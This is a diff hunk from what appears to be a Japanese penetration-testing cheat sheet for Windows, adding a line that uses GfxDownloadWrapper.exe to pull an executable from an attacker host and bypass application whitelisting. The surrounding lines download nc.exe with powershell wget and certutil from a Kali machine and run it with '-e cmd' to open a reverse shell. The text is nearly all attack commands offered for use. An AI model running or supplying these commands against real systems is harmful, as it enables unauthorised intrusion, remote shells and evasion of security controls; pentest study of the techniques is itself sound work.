@@ -114,4 +114,5 @@ powershell wget http://<IP>/example.exe -outfile example.exe
 
 //wgetやcurlが使えないwindowsのとき
 certutil.exe -urlcache -split -f http://<kali IP>:<port>/nc.exe C:\Windows\Temp\nc.exe　#コマンドでncを持ってくる
+GfxDownloadWrapper.exe "http://<kali IP>/example.exe" "C:\Temp\example.exe" #アプリのホワイトリスト回避
 cmd.exe /c C:\Windows\Temp\nc.exe <kali IP> <port> -e cmd #配送したncをcmdで実行してシェル
